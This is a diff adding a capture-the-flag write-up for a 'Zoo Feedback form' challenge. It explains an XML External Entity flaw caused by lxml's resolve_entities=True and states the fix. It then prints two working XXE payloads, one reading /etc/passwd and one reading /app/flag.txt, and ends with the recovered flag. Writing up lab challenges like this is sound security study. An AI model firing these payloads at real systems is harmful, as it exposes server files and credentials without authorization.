@@ -69,4 +69,52 @@
 
 ---------------------------------------
 
+### Challenge: Zoo Feedback form
 
+![image](https://github.com/user-attachments/assets/25cbd005-207a-423c-b2e1-9403eb6efbb7)
+
+- After reviewing the source code, I noticed that `resolve_entities` was set to `True` which forces lxml parser to resolve external entities. In a whole, the main vulnerability is `XML External Entity Expansion` which allows an attacker to inject xml entities into a web application.
+
+  Vulnerable Code:
+            
+            try:
+               parser = etree.XMLParser(resolve_entities=True)
+
+- Fix: Set resolve_entities to `False`
+
+- I intercepted the request with burpsuite
+
+   ![image](https://github.com/user-attachments/assets/4da48e9d-c2f3-42ca-92b1-aeb1e05ba5ac)
+
+- I used this payload to read the `/etc/passwd` file
+
+  Payload:
+
+      <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+                  <root>
+                 <feedback>
+                  &example;
+                 </feedback>
+                  </root>
+
+![image](https://github.com/user-attachments/assets/7451bb98-b2c6-47f4-8c3b-17f946a889f2)
+
+- Then, I read the flag located at `/app/flag.txt`.
+
+            <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]>
+                        <root>
+                       <feedback>
+                          &example;
+                        </feedback>
+                        </root>
+
+![image](https://github.com/user-attachments/assets/ab20d730-43d0-48d2-99bd-f933e65dc8ee)
+
+- Flag-:```DUCTF{emU_say$_he!!0_h0!@_ci@0}```
+
+--------------------------
+### References:
+--------------------------
+
+- Lxml.etree's XXE Attack: [Codeql's blog](https://codeql.github.com/codeql-query-help/python/py-xxe/)
+- XXE's details: [Hacktrickz](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
